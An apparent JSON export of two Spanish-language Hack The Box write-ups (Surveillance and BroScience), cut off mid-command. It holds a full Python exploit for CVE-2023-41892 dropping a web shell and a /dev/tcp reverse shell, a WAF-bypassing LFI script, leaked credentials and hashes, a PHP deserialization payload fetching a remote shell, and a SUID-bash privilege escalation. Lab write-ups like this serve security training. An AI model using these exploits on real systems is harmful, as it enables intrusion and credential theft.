[ { "title": "Surveillance Writeup", "url": "/posts/Writeup-Surveillance/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Medium", "date": "2023-12-16 00:00:00 -0500", "snippet": "ReconocimientoInicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados.❯ nmap -p- -sS --min-rate=5...", "content": "ReconocimientoInicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados.❯ nmap -p- -sS --min-rate=5000 --open -v -n -Pn 10.10.11.245 -oG OpenPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 13:12 -05Initiating SYN Stealth Scan at 13:12Scanning 10.10.11.245 [65535 ports]Discovered open port 80/tcp on 10.10.11.245Discovered open port 22/tcp on 10.10.11.245Completed SYN Stealth Scan at 13:12, 22.92s elapsed (65535 total ports)Nmap scan report for 10.10.11.245Host is up (0.082s latency).Not shown: 49379 closed tcp ports (reset), 16154 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 22.99 seconds Raw packets sent: 113878 (5.011MB) | Rcvd: 62549 (2.502MB)Se aprecia el puerto 80 abierto corriendo “http” y el 22 corriendo “ssh”. Ya que hay una página a través de dicho puerto, con whatweb se veo las tecnologías que se emplean en la Web.❯ whatweb http://10.10.11.245http://10.10.11.245 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], RedirectLocation[http://surveillance.htb/], Title[302 Found], nginx[1.18.0]ERROR Opening: http://surveillance.htb/ - no address for surveillance.htbVeo que hay un dominio de por medio y no carga la Web ya que el dominio hay que añadirlo al fichero /etc/hosts junto a la IP para que a nivel de DNS se resuelva dicho dominio a la IP.❯ echo \"10.10.11.245 surveillance.htb\" &gt;&gt; /etc/hosts❯ catnp /etc/hosts # Host addresses 127.0.0.1 localhost 127.0.1.1 parrot ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters # Others # 10.10.11.245 surveillance.htbPosteriormente se visualizo la Web para ver qué contieneVisualizando la WebLuego con Nmap se hago un escaneo a los puertos específicos encontrados previamente, especificando parámetros para ver la versión de los servicios (HTTP y SSH) que están bajo esos puertos❯ nmap -sCV -p22,80 10.10.11.245 -oN servicesStarting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 13:37 -05Nmap scan report for surveillance.htb (10.10.11.245)Host is up (0.21s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)|_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Surveillance|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.24 secondsHago un fuzzeo con wfuzz a la Web y descubro una ruta /admin❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://surveillance.htb/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://surveillance.htb/FUZZTotal requests: 220560=====================================================================ID Response Lines Word Chars Payload=====================================================================000000015: 200 1 L 0 W 1 Ch \"index\"000000007: 200 475 L 1185 W 16228 Ch \"# license, visit http://creativecommons.org/licenses/by-sa/3.0 /\"000000001: 200 475 L 1185 W 16228 Ch \"# directory-list-2.3-medium.txt\"000000003: 200 475 L 1185 W 16228 Ch \"# Copyright 2007 James Fisher\"000000039: 301 7 L 12 W 178 Ch \"img\"000000016: 301 7 L 12 W 178 Ch \"images\"000000014: 200 475 L 1185 W 16228 Ch \"http://surveillance.htb/\"000000259: 302 0 L 0 W 0 Ch \"admin\"Luego voy a la Web a ver qué contiene esta ruta y me redirige a /admin/login. Veo que tiene un gestor de contenidos (CMS) llamado CraftCraft CMS LoginLuego buscando “Craft CMS vulnerabilities” y en el primer resultado de la búsqueda, veo que está el CVE-2023-41892 con un CVSS críticoCraft CMS CVEExplotaciónLuego buscando por el CVE correspondiente encontré un POC el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones escribiendolo desde cero para comprender todo lo que pasa por detrás.Pero antes de continuar con el script, voy a explicar la manera de como entendí cómo sucede todo por detrás, porque soy un curioso y la curiosidad mato al …Primeramente, dentro del POC hay un link donde se nos explica la vulnerabilidad un poco más en detalle. Para resumir todo, básicamente lo que se hace por detrás es que se puede crear un Objeto gracias a los distintos métodos que hay corriendo. Dentro de esos métodos hay uno el cual es \\yii\\rbac\\PhpManager::loadFromFile que lo que hace es cargar datos desde un archivo, el archivo que indicaremos en el script.Luego tenemos en el código base de Craft CMS una clase \\GuzzleHttp\\Psr7\\FnStream que lo que hace es destruir el objeto y hace una limpieza en la memoria, esto nos sirve para poder cargar el phpinfo al realizar una nueva instancia de dicha clase.Una vez entendido esto y que podemos crear objetos a nuestro gusto, está la ocurrencia en la extensión Imagick, la cual posteriormente será un objeto. En este link se nos explica cómo funciona todo.Ahora abusaremos de la extensión Imagick de PHP, donde dicha extensión acepta como parámetro files y a este parámetro se le podrán pasar rutas de alguna imágen, una url, o incluso wildcards. (Véase Imagick Constructor).Imagick admite el formato MSL, a través y gracias a dicho formato es que lograremos explotar la vulnerabilidad. A través de este formato seremos capaces de leer o mejor dicho, php será capaz de interpretar un archivo MSL en una ruta donde se le indique.Una vez comprendido esto, lo que haremos será crear el archivo MSL con formato XML ya que así viene el formato MSL y a través del esquema VID de Imagick y con wildcards podemos llegar a saber el nombre del archivo el cual se sube en la máquina víctima, ya que el archivo se sube en la ruta temporal por defecto gracias a que generamos un error por HTTP, solamente que dicho archivo tendrá un nombre que inicia por php y lo que le siga de manera aleatoria. A través del esquema VID lo que se conseguirá no es sólo el nombre del archivo sino que también jugando junto a MSL podremos hacer que se ejecute el archivo subido. Una vez entendido todo (O espero que así haya sido) podemos ver el scritp.#!/usr/bin/env python3from termcolor import coloredimport argparseimport requestsimport signalimport timeimport sysimport redef leaving(sig, frame): print(colored(\"\\n[!] Saliendo...\\n\")) sys.exit(1)signal.signal(signal.SIGINT, leaving)proxy = {'http':'http://127.0.0.1:8080'}headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0\"}def get_target(): parser = argparse.ArgumentParser(description=\"Exploit for CVE-2023-41892\") parser.add_argument(\"-t\", \"--target\", required=True, dest=\"target\", help=\"exploit.py -t &lt;ip target or domain&gt;\") parser.add_argument(\"-l\", \"--listen\", required=True, dest=\"listen\", help=\"exploit.py -t -i &lt;your attacker ip&gt;\") parser.add_argument(\"-p\", \"--port\", required=True, dest=\"port\", help=\"exploit.py -t -i &lt;your attacker port of listening&gt;\") args = parser.parse_args() return args.target, args.listen, args.portdef get_route_web(): #Obtenemos la ruta donde se almacena la página web data = { \"action\": \"conditions/render\", \"testConfigObject\":\"craft\\elements\\conditions\\ElementCondition\", \"config\": r'{\"name\":\"testConfigObject\",\"as \":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\", \"__construct()\":{\"methods\":{\"close\":\"phpinfo\"}}}}' } r = requests.post(target, headers=headers, data=data, proxies=proxy) route_web = r'&lt;tr&gt;&lt;td class=\"e\"&gt;\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]&lt;\\/td&gt;&lt;td class=\"v\"&gt;([^&lt;]+)&lt;\\/td&gt;&lt;/tr&gt;' match = re.search(route_web, r.text, re.DOTALL) return match.group(1)def write_payload(web_route): #Enviamos un archivo en formato MSL cuya estructura será una imágen y en XML, antes de realizar el envío cargamos a través de la extensión Imagick y con formato MSL el /etc/hosts para que la solicitud HTTP falle, lo que hará que el archivo que enviamos se cargue en la ruta /tmp print(colored(\"\\n[*] Enviando archivo de imagen...\", 'green')) data = { \"action\": \"conditions/render\", \"testConfigObject\":\"craft\\elements\\conditions\\ElementCondition\", \"config\": r'{\"name\":\"testConfigObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/hosts\"}}}' } image_file = { \"image\": (\"pwned.msl\", f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF8\"?&gt; &lt;image&gt; &lt;read filename=\"caption:&amp;lt;?php @system(@$_REQUEST['ts']); ?&amp;gt;\"/&gt; &lt;write filename=\"info:{web_route}/cpresources/ts.php\"/&gt; &lt;/image&gt;\"\"\", \"text/plain\") } r = requests.post(target, headers=headers, data=data, files=image_file)def execute_msl(): #Ejecutamos a través del esquema vid y formato msl para buscar el nombre del archivo mediante wildcards y con la extensión imagick print(colored(\"\\n[*] Obteniendo nombre del archivo...\\n\", 'green')) data = { \"action\": \"conditions/render\", \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\", \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + \"/tmp\" + r'/php*\"}}}' } r = requests.post(target, headers=headers, data=data)def get_shell(your_ip, port): #Enviamos la shell hacia el puerto indicado por el usuario print(colored(f\"[*] Ponte en escucha por el puerto {port}\", 'green')) time.sleep(2) execute_shell = f'bash -c \"bash -i &gt;&amp; /dev/tcp/{your_ip}/{port} 0&gt;&amp;1\"' params = {\"ts\": execute_shell} r = requests.get(target + \"/cpresources/ts.php\" , headers=headers, params=params)def main(): global target target, your_ip, port = get_target() target = \"http://\" + target web_route = get_route_web() write_payload(web_route) execute_msl() get_shell(your_ip, port)if __name__=='__main__': main()Una vez ejecutado el script, estamos dentro de la máquina. Después de buscar un largo rato por algún archivo interesante en el servidor, encontré surveillance–2023-10-17-202801–v4.4.14.sql.zip bajo la ruta /var/www/html/craft/storage/backups. Lo que haré será traerme ese archivo comprimido a mi equipo y descomprimirlo.Ya que es un archivo muy grande al descomprimirlo, lo que haré será grepear por “username” y luego por el usuario que encontré el cual es “Matthew” y veremos la contraseña del usuario cifrada.Grep DataBase FileAhora lo que haré será ver qué tipo de hash es mediante hash-identifierIdentify hashYa que el hash es sha256 lo crackearé con John utilizando el rockyou.txt. Luego ingresaré por SSH utilizando la contraseña del usuario matthew❯ echo -n \"39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec\" &gt; hash❯ john -w=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256Created directory: /root/.johnUsing default input encoding: UTF-8Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])Warning: poor OpenMP scalability for this hash type, consider --fork=8Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusstarcraft1 (?)1g 0:00:00:00 DONE (2023-12-17 20:39) 5.882g/s 21588Kp/s 21588Kc/s 21588KC/s stefon23..sn283437Use the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliablySession completed.User PivotingVeo los puertos internos abiertos y veo el 8080 el cual contiene una páginamatthew@surveillance:~$ ss -nltpState Recv-Q Send-Q Local Address:Port Peer Address:Port ProcessLISTEN 0 80 127.0.0.1:3306 0.0.0.0:*LISTEN 0 511 127.0.0.1:8080 0.0.0.0:*LISTEN 0 511 0.0.0.0:80 0.0.0.0:*LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*LISTEN 0 128 0.0.0.0:22 0.0.0.0:*LISTEN 0 128 [::]:22 [::]:*Lo que haré será a través de ssh realizar un forward para que el puerto 8080 de la máquina víctima sea mi puerto 8080 local❯ ssh matthew@10.10.11.245 -L 8080:127.0.0.1:8080Luego vi la Web y utilizaban Zoneminder, un software para CCTV, busqué vulnerabilidades para ese software y encontré un RCE sin estar autenticados junto a un exploit. En este caso se abusa del csrftoken hardcodeado en el código del servidor y junto a ciertos parámetros (incluyendo el csrftoken) se logra la ejecución. Ahora somos el usuario ZoneMinderPrivescHaciendo un sudo -l para ver qué permisos de Sudoers tiene el usuario veo lo siguientezoneminder@surveillance:/usr/share/zoneminder/www$ sudo -lMatching Defaults entries for zoneminder on surveillance: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *zoneminder@surveillance:/usr/share/zoneminder/www$Hago un grepeo utilizando la misma expresión regular que hay en los permisos de sudoers, para ver qué archivos hay que tengan esa estructurazoneminder@surveillance:/usr/bin$ ls | grep -oP '^zm[a-zA-Z]+\\.pl$' | xargs ls -la-rwxr-xr-x 1 root root 43027 Nov 23 2022 zmaudit.pl-rwxr-xr-x 1 root root 12939 Nov 23 2022 zmcamtool.pl-rwxr-xr-x 1 root root 6043 Nov 23 2022 zmcontrol.pl-rwxr-xr-x 1 root root 26232 Nov 23 2022 zmdc.pl-rwxr-xr-x 1 root root 35206 Nov 23 2022 zmfilter.pl-rwxr-xr-x 1 root root 13994 Nov 23 2022 zmpkg.pl-rwxr-xr-x 1 root root 17492 Nov 23 2022 zmrecover.pl-rwxr-xr-x 1 root root 4815 Nov 23 2022 zmstats.pl-rwxr-xr-x 1 root root 2133 Nov 23 2022 zmsystemctl.pl-rwxr-xr-x 1 root root 13111 Nov 23 2022 zmtelemetry.pl-rwxr-xr-x 1 root root 5340 Nov 23 2022 zmtrack.pl-rwxr-xr-x 1 root root 18482 Nov 23 2022 zmtrigger.pl-rwxr-xr-x 1 root root 45421 Nov 23 2022 zmupdate.pl-rwxr-xr-x 1 root root 8205 Nov 23 2022 zmvideo.pl-rwxr-xr-x 1 root root 7022 Nov 23 2022 zmwatch.plVeo que hay distintos archivos. Hay uno que me llama la atención y es zmupdate, analizando un poco la manera en la que se ejecuta veo que es para actualizar la base de datos de zoneminder, para ello me pide las credenciales de la base de datos de dicho software, entonces lo que haré será buscar en el sistema dónde está el archivo de configuración de la base de datos.Descubro que la ruta donde se almacena la Web es en /usr/share/zoneminder con el comando find / -group zoneminder 2&gt;/dev/nullYendome a la ruta veo el www, entro ahí y ejecuto lo siguiente para buscar de manera recursiva por la palabra “password” en todos los archivos bajo el directorio actual de trabajo:zoneminder@surveillance:/usr/share/zoneminder/www$ grep -r \"password\"Y sopresa!. Encontré la contraseña de la base de datos de ZoneminderPassword DBAhora sí, podemos proceder a la explotación del script escrito en perl. Lo que haré será actualizar la versión de la base de datos a la 1 (está en la versión 1.36.32, es decir la estamos degradando) para efectuar la actualización, ya que el script lo que se supone que hace es actualizar algo en la base de datos. Luego a nivel de usuario metemos lo que queremos ejecutar, en mi caso crearé un archivo en /dev/shm (Una ruta temporal del sistema que de ella poco se habla eh!) el cual será test.sh, con el siguiente contenido:#!/bin/bashchmod u+s /bin/bashLo que haré será asignarle el permiso SUID a la bash, luego ejecuto el script con los siguientes parámetros (Luego de realizar algunas pruebas descubrí que realmente no necesitas la contraseña de la base de datos, pero bueno, al menos ya sabes cómo buscar con grep xd)PrivescY listo! obtenemos root, espero te haya gustado el Writeup y si quieres dejame el respect de HTB adjunto acá mismo en mi blog. Si quieres comentarme algo escribeme a mi Twitter al DM. Hasta el próximo Writeup!!" }, { "title": "BroScience Writeup", "url": "/posts/writeup-broscience/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Medium, LFI, Waf bypass, Deserialization Attack, Cron Job, Cracking Passwords", "date": "2023-01-09 00:00:00 -0500", "snippet": "En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la...", "content": "En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo.Primeramente ejecutamos un escaneo con nmap❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.95.77 -oG OpenPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Scanning 10.129.95.77 [65535 ports]PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsVemos el puerto 80 y 443 abiertos, ahora lanzamos un whatweb para ver las tecnologías que se emplean en el puerto 80❯ whatweb http://10.129.95.77http://10.129.95.77 [301 Moved Permanently] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], RedirectLocation[https://broscience.htb/], Title[301 Moved Permanently]https://broscience.htb/ [200 OK] Apache[2.4.54], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], Script, Title[BroScience : Home]Vemos que hace un redirect a “broscience.htb”, lo añadimos al “/etc/hosts”. Si nos dirigimos a la web nos redirige hacia el “https” con el certificado SSL autofirmado.Ahora escaneamos con nmap para ver la versión de los servicios que hay en los puertos abiertos❯ nmap -sCV -p22,80,443 10.129.95.77 -oN servicesNmap scan report for broscience.htb (10.129.95.77)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)| 256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)|_ 256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)80/tcp open http Apache httpd 2.4.54|_http-server-header: Apache/2.4.54 (Debian)|_http-title: Did not follow redirect to https://broscience.htb/443/tcp open ssl/http Apache httpd 2.4.54 ((Debian))| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT| Not valid before: 2022-07-14T19:48:36|_Not valid after: 2023-07-14T19:48:36|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.54 (Debian)|_http-title: BroScience : Home| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| tls-alpn: |_ http/1.1Fuzzeamos con Wfuzz❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://broscience.htb/FUZZ=====================================================================ID Response Lines Word Chars Payload =====================================================================000000014: 200 146 L 510 W 9308 Ch \"https://broscience.htb/\"000000016: 301 9 L 28 W 319 Ch \"images\" 000000638: 301 9 L 28 W 321 Ch \"includes\" 000000730: 301 9 L 28 W 319 Ch \"manual\" 000001073: 301 9 L 28 W 323 Ch \"javascript\" 000001717: 301 9 L 28 W 319 Ch \"styles\"Vemos un “/includes” y dentro un “img.php”, y cuando entramos vemos que nos dice Error: Missing ‘path’ parameter. Es decir, hay un parámetro “path”, lo usamos a ver qué❯ curl -k 'https://broscience.htb/includes/img.php?path=../../../../../etc/passwd'&lt;b&gt;Error:&lt;/b&gt; Attack detected.Vemos que detecta un ataque si intentamos un LFI, pero se puede bypassear con doble urlencode, para ello me haré un script de python#!/usr/bin/python3import urllib.parse, os, pdbinjection = input(\"Qué archivo quieres visualizar? \")injection = urllib.parse.quote_plus(injection)injection = urllib.parse.quote_plus(injection) command = \"curl -k 'https://broscience.htb/includes/img.php?path=\" + injection + \"'\"execute = os.system(command)print(execute)Ahora para visualizar un fichero simplemente lo introducimos❯ ./lfi.pyQué archivo quieres visualizar? ../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologintss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/falsemessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinusbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologinsshd:x:108:65534::/run/sshd:/usr/sbin/nologindnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinavahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falsepulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologinsaned:x:113:121::/var/lib/saned:/usr/sbin/nologincolord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologinDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsebill:x:1000:1000:bill,,,:/home/bill:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinpostgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash_laurel:x:998:998::/var/log/laurel:/bin/falseAhora podemos visualizar el archivo de “db_connect.php” que hay en includes❯ ./lfi.pyQué archivo quieres visualizar? ../includes/db_connect.php&lt;?php$db_host = \"localhost\";$db_port = \"5432\";$db_name = \"broscience\";$db_user = \"dbuser\";$db_pass = \"RangeOfMotion%777\";$db_salt = \"NaCl\";$db_conn = pg_connect(\"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\");if (!$db_conn) { die(\"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database\");}?&gt;Ya tenemos las credenciales de la base de datos pero por ahora eso no nos interesa. Visualizamos el “utils.php” y lo guardamos en un fichero❯ ./lfi.py &gt; utils.php../includes/utils.php % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 3060 100 3060 0 0 4533 0 --:--:-- --:--:-- --:--:-- 4526Ahora viendo el código, podemos ver cómo se genera el código de activación cuando intentamos crear un usuario&lt;?phpfunction generate_activation_code() { $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"; srand(time()); $activation_code = \"\"; for ($i = 0; $i &lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code;}También podemos ver un archivo “activate.php”, si lo guardamos y lo visualizamos podemos ver que nos manda a un link cuando genera el código de activación❯ cat register.php | grep \"activate\" $activation_link = \"https://broscience.htb/activate.php?code={$activation_code}\";Vemos que genera un código de 32 dígitos y en base a la hora del sistema cuando tramitamos la petición de creación de usuario. Esto gracias a la función “srand” que funciona como semilla de hora. Creamos un usuario e interceptamos la petición con burpsuite y para el script de php copiamos la fecha que nos da el servidor y la ponemos en el script. Ahora con un script de php podemos intentar fuzzear por los códigos aleatorios que nos genera el script&lt;?phpfunction generate_activation_code($time) { $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\"; srand($time); $activation_code = \"\"; for ($i = 0; $i &lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code;}$ref_time = date(\"U\",strtotime('Mon, 09 Jan 2023 23:32:24 GMT'));for ($t = $ref_time - 500; $t &lt;= $ref_time + 500; $t++) echo generate_activation_code($t).\"\\n\";❯ wfuzz --hh=1256 -c -z file,codigos.php 'https://broscience.htb/activate.php?code=FUZZ'=====================================================================ID Response Lines Word Chars Payload =====================================================================000000501: 200 27 L 65 W 1251 Ch \"9RLps9HakHqodR6BQGz3HcHux72To6ei\"Y listo, ya puedes iniciar sesión en la web. Ahora vemos la cookie “user-prefs” que vemos que está en base64, si lo decodificamos vemos lo siguiente❯ echo \"Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=\" | base64 -dO:9:\"UserPrefs\":1:{s:5:\"theme\";s:5:\"light\";}Si vemos en el script de “utils.php” vemos que las cookies son serializadas y el servidor la deserializa para interpretarla. Con esto ya sabemos que podemos efectuar un “deserialization Attack”function get_theme() { if (isset($_SESSION['id'])) { if (!isset($_COOKIE['user-prefs'])) { $up_cookie = base64_encode(serialize(new UserPrefs())); setcookie('user-prefs', $up_cookie); } else { $up_cookie = $_COOKIE['user-prefs']; } $up = unserialize(base64_decode($up_cookie)); return $up-&gt;theme; } else { return \"light\"; }}Nos copiamos un script de php de monkey pentesterAhora modificamos el “utils.php” al final del script para cargar un recurso de nuestra máquina al servidorclass AvatarInterface { public $tmp = \"http://10.10.16.68/shell.php\"; public $imgPath = \"./shell.php\"; public function __wakeup() { $a = new Avatar($this-&gt;imgPath); $a-&gt;save($this-&gt;tmp); }}echo base64_encode(serialize(new AvatarInterface));?&gt;Le damos permisos de ejecución y lo ejecutamos❯ php utils.phpTzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE2LjY4L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==Ahora cargamos ese base64 a las cookies, y recargamos la páginaNota: Ponemos los dos “==” url encodeados cuando los pongamos en la página antes de recargarCambiando CookiesLuego nos vamos a “https://broscience.htb/shell.php” para que se ejecute el scrip. Pero nos ponemos en escucha por el puerto 80 con python y en escucha con netcat por el puerto 443❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.129.95.77 - - [09/Jan/2023 19:06:14] \"GET /shell.php HTTP/1.0\" 200 -10.129.95.77 - - [09/Jan/2023 19:06:14] \"GET /shell.php HTTP/1.0\" 200 -10.129.95.77 - - [09/Jan/2023 19:06:15] \"GET /shell.php HTTP/1.0\" 200 -❯ nc -nlvp 443listening on [any] 443 ...connect to [10.10.16.68] from (UNKNOWN) [10.129.95.77] 37776Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux 19:06:17 up 19:34, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ whoamiwww-data$ hostname -I10.129.95.77 dead:beef::250:56ff:feb9:c1d3Una vez hemos obtenido acceso, hay que cambiar de usuario. Para ello nos conectamos a la base de datos que se emplea. Si hacemos un “ps -faux” para ver las tareas que se están ejecutando, vemos un “postgress” ya con esto sabes que se emplea Postgress SQLwww-data@broscience:/$ psql -U dbuser -h localhost -W -d broscience Password: RangeOfMotion%777Enumeramos las tablas que haybroscience=&gt; \\dt; List of relations Schema | Name | Type | Owner --------+-----------+-------+---------- public | comments | table | postgres public | exercises | table | postgres public | users | table | postgres(3 rows)broscience=&gt; Ahora vemos el contenido de la tabla usersbroscience=&gt; select * from users; 1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | 2 | bill | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | 3 | michael | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | 4 | john | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | 5 | dmytro | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm |Vemos los hashes, los copiamos y los rompemos con hashcat. Una cosa a tener en cuenta es que estos hashes necesitan del “salt” que esto es para que sea más complicado a un atacante romper los hashes, pero nosotros ya lo tenemos que lo encontramos en el archivo de “db_connect.php”Ahora así nos quedan los hashes❯ cat 